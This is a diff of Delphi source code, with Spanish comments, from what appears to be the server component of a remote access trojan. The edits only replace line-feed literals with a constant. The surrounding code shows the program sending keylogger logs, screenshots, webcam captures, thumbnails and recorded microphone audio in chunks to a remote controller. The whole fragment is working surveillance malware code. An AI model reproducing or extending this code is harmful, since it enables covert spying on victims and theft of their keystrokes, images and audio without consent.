@@ -62,7 +62,7 @@ begin
             begin
               Enviando[4] := True;
               EnviandoStr[4] := CapturaKeylogger;
-              server.SendString('SH|' + SH + #10 + 'KEYLOGGERLOGSTART|' + IntToStr(Length(EnviandoStr[4])) + '|' + #10); //Enviamos el tamaño
+              server.SendString('SH|' + SH + ENTER + 'KEYLOGGERLOGSTART|' + IntToStr(Length(EnviandoStr[4])) + '|' + ENTER); //Enviamos el tamaño
             end;
 
           TempStr := Copy(EnviandoStr[4], 1, BlockSize); //Bloques de BlockSize
@@ -70,7 +70,7 @@ begin
 
           if TempStr <> '' then
             begin
-              server.SendString('SH|' + SH + #10 + 'KEYLOGGERLOGCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
+              server.SendString('SH|' + SH + ENTER + 'KEYLOGGERLOGCHUNK|' + IntToStr(Length(TempStr)) + '|' + ENTER + TempStr); //GOGOGO
             end
           else
             begin
@@ -99,7 +99,7 @@ begin
               MS.Free;
               MS := nil;
               //De paso se manda también la anchura y la altura para poder simular clicks
-              server.SendString('SH|' + SH + #10 + 'CAPSCREENSTART|' + IntToStr(AnchuraPantalla) + '¬' + IntToStr(AlturaPantalla) + '|' + IntToStr(Length(EnviandoStr[0])) + #10); //mandamos el tamaño
+              server.SendString('SH|' + SH + ENTER + 'CAPSCREENSTART|' + IntToStr(AnchuraPantalla) + '¬' + IntToStr(AlturaPantalla) + '|' + IntToStr(Length(EnviandoStr[0])) + ENTER); //mandamos el tamaño
 
               Enviando[0] := True;
             end;
@@ -109,7 +109,7 @@ begin
 
           if TempStr <> '' then
             begin
-              server.SendString('SH|' + SH + #10 + 'CAPSCREENCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
+              server.SendString('SH|' + SH + ENTER + 'CAPSCREENCHUNK|' + IntToStr(Length(TempStr)) + '|' + ENTER + TempStr); //GOGOGO
             end
           else
             begin
@@ -122,14 +122,14 @@ begin
         begin
           if not Enviando[1] then
             begin
-              server.SendString('SH|' + SH + #10 + 'CAPTURAWEBCAMSTART|' + IntToStr(Length(CapturaWebcam)) + #10); //mandamos el tamaño
+              server.SendString('SH|' + SH + ENTER + 'CAPTURAWEBCAMSTART|' + IntToStr(Length(CapturaWebcam)) + ENTER); //mandamos el tamaño
               Enviando[1] := True;
               EnviandoStr[1] := CapturaWebcam;
             end;
 
           TempStr := Copy(EnviandoStr[1], 1, BlockSize); //Bloques de BlockSize
           Delete(EnviandoStr[1], 1, BlockSize);
-          server.SendString('SH|' + SH + #10 + 'WEBCAMCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
+          server.SendString('SH|' + SH + ENTER + 'WEBCAMCHUNK|' + IntToStr(Length(TempStr)) + '|' + ENTER + TempStr); //GOGOGO
 
           if EnviandoStr[1] = '' then
             begin
@@ -161,7 +161,7 @@ begin
                   MS.Position := 0;
                   if server.Connected then
                     begin
-                      server.SendString('SH|' + SH + #10 + 'THUMBNAILSTART|' + IntToStr(MS.Size) + #10); //mandamos el tamaño
+                      server.SendString('SH|' + SH + ENTER + 'THUMBNAILSTART|' + IntToStr(MS.Size) + ENTER); //mandamos el tamaño
                     end;
                   EnviandoStr[2] := '';
                   SetLength(EnviandoStr[2], ms.Size);
@@ -174,7 +174,7 @@ begin
                   Enviando[2] := False; //Ya hemos terminado
                   CapturaThumb := '';
                   if server.Connected then
-                    server.SendString('SH|' + SH + #10 + 'THUMBNAILERROR' + #10);
+                    server.SendString('SH|' + SH + ENTER + 'THUMBNAILERROR' + ENTER);
                 end;
             end
           else
@@ -185,7 +185,7 @@ begin
 
               if TempStr <> '' then
                 begin
-                  server.SendString('SH|' + SH + #10 + 'THUMBNAILCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
+                  server.SendString('SH|' + SH + ENTER + 'THUMBNAILCHUNK|' + IntToStr(Length(TempStr)) + '|' + ENTER + TempStr); //GOGOGO
                 end
               else
                 begin
@@ -201,7 +201,7 @@ begin
           Enviando[3] := True;
           EnviandoStr[3] := RecordedAudio;
           RecordedAudio := '';
-          server.SendString('SH|' + SH + #10 + 'AUDIOSTART|' + IntToStr(Length(EnviandoStr[3])) + '|' + #10);
+          server.SendString('SH|' + SH + ENTER + 'AUDIOSTART|' + IntToStr(Length(EnviandoStr[3])) + '|' + ENTER);
         end;
 
       if ((CapturaAudio <> '') or Enviando[3]) and (not grabando) then
@@ -246,7 +246,7 @@ begin
 
               if TempStr <> '' then
                 begin
-                  server.SendString('SH|' + SH + #10 + 'AUDIOCHUNK|' + IntToStr(Length(TempStr)) + '|' + #10 + TempStr); //GOGOGO
+                  server.SendString('SH|' + SH + ENTER + 'AUDIOCHUNK|' + IntToStr(Length(TempStr)) + '|' + ENTER + TempStr); //GOGOGO
                 end
               else
                 begin
